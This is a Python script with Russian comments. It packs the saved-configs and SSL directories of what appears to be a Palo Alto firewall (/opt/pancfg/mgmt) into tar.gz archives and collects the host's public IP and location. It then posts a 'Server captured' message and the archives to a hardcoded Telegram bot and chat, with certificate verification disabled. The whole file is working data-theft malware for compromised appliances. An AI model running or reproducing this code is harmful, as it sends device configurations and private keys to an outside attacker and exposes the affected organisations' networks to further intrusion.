import requests
import os
import tarfile
import io
import hashlib

def archive_directory(directory_path):
    """
    Упаковывает директорию в архив формата tar.gz.
    """
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        # Проверяем, что путь - директория
        if os.path.isdir(directory_path):
            # Добавляем содержимое директории
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    # Относительный путь для сохранения структуры директорий
                    arcname = os.path.relpath(file_path, start=directory_path)
                    tar.add(file_path, arcname=arcname)
        else:
            raise ValueError(f"Путь {directory_path} не является директорией")
    tar_stream.seek(0)
    return tar_stream

def send_telegram_message_with_files(message, file_paths):
    """
    Отправляет сообщение и файлы в Telegram.
    """
    tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
    tg_chat_id = '-1002403648422'
    
    # Формируем ссылку на Telegram API
    url = f'https://api.telegram.org/bot{tg_bot_token}/sendMessage'
    
    # Формируем сообщение с ссылками на файлы
    message += "\n\n" + "\n".join([f"Отправка файлов: {file}" for file in file_paths])

    payload = {
        'chat_id': tg_chat_id,
        'text': message
    }
    
    # Отправка сообщения
    response = requests.post(url, data=payload, verify=False)
    
    # Отправка файлов
    for file_path in file_paths:
        with open(file_path, 'rb') as file:
            files = {
                'chat_id': tg_chat_id,
                'document': (os.path.basename(file_path), file)
            }
            send_file_url = f'https://api.telegram.org/bot{tg_bot_token}/sendDocument'
            send_response = requests.post(send_file_url, files=files, verify=False)
            if send_response.status_code == 200:
                print(f"Файл {file_path} отправлен.")
            else:
                print(f"Ошибка при отправке файла {file_path}. Статус код: {send_response.status_code}")
    
    return response.ok

def main():
    try:
        # Получаем IP из внешнего ресурса
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # Формируем сообщение
        message = "🟢 Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{str(ip_hash)[:8]}"  # Используем хэш IP

        # Пути к директориям
        directories_to_archive = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
        
        # Упаковка директорий в архивы
        archived_files = []
        for directory in directories_to_archive:
            archive_stream = archive_directory(directory)
            archive_path = f"{os.path.basename(directory)}.tar.gz"
            with open(archive_path, 'wb') as f:
                f.write(archive_stream.read())
            archived_files.append(archive_path)

        if archived_files:
            # Отправка сообщений и файлов
            success = send_telegram_message_with_files(message, archived_files)
            if success:
                print("Message sent successfully!")
            else:
                print("Error sending message.")
            
            # Если файлы успешно загружены на сервер, отправляем их
            print("Successfully uploaded files:", archived_files)
        else:
            print("No files to upload.")
    
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
